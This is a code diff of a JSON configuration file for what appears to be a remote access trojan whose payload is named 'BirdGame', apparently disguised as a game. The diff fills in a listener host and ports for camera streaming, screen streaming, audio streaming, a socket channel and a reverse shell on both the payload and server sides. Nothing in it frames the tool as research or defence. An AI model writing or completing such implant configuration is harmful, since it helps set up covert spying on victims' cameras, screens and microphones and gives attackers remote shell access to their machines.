@@ -1,22 +1,23 @@
 {
     "PayloadConfig" : {
         "name" : "BirdGame",
-        "lhost" : "",
+        "lhost" : "auto",
         "lport" :{
-            "SocketPort" : "",
-            "CameraStreamingPort" : "",
-            "ScreenStreamingPort" : "",
-            "ReverseShellPort" : "",
-            "AudioStreamingPort" : ""
+            "SocketPort" : "9887",
+            "CameraStreamingPort" : "8989",
+            "ScreenStreamingPort" : "7676",
+            "ReverseShellPort" : "5656",
+            "AudioStreamingPort" : "5876"
         }
     },
     "ServerConfig" : {
-        "lhost" : "",
+        "lhost" : "auto",
         "lport" : {
-            "CameraStreamingPort" : "",
-            "ScreenStreamingPort" : "",
-            "ReverseShellPort" : "",
-            "AudioStreamingPort" : ""
+            "SocketPort" : "9887",
+            "CameraStreamingPort" : "8989",
+            "ScreenStreamingPort" : "7676",
+            "ReverseShellPort" : "5656",
+            "AudioStreamingPort" : "5876"
         }
     }
 }
